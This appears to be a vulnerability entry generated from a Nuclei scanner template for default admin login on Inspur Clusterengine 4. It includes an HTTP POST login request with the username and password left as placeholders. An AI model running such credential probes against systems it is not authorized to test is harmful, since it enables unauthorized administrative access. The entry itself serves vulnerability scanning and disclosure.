# Nuclei Template: Inspur Clusterengine 4 - Default Admin Login
**Template ID:** inspur-clusterengine-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`inspur-clusterengine-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Inspur Clusterengine version 4 default admin login credentials were successful.

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}

op=login&username={{username}}&password={{password}}
```

## References
- https://blog.csdn.net/qq_36197704/article/details/115665793
